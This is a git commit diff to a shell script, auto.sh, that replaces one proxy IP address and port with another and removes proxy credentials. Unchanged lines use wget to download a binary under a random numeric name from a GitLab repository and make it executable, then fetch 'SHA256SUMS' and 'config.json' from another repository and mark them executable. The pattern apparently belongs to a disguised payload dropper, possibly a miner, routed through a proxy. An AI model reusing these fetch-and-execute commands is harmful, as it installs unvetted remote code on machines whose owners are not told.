5858dfe949db62fd0edad602625de78bdfe2d2c7
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2023-12-31 16:07:46 +0700

    Update auto.sh

--- auto.sh
+++ auto.sh
@@ -1,7 +1,5 @@
-proxy="149.50.222.86" 
-port="1080" 
-user="render"  
-pass="render"  
+proxy="192.252.209.155" 
+port="14455"   
 wget -q -O 0083075176 https://gitlab.com/55113110159/dokerweb/-/raw/main/zydo191 && chmod +x 0083075176
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
